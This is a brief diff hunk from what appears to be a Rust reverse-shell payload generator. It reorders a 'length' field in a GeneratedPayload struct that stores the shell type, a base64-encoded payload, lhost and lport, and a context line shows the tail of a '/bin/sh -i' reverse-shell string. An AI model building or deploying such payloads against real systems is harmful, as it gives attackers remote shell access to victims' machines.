@@ -146,12 +146,12 @@ exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
     GeneratedPayload {
         shell_type,
+        length: payload.len(),
         payload,
         encoded_payload: encoded,
         encoding: PayloadEncoding::Base64,
         lhost: lhost.to_string(),
         lport,
-        length: payload.len(),
     }
 }
 
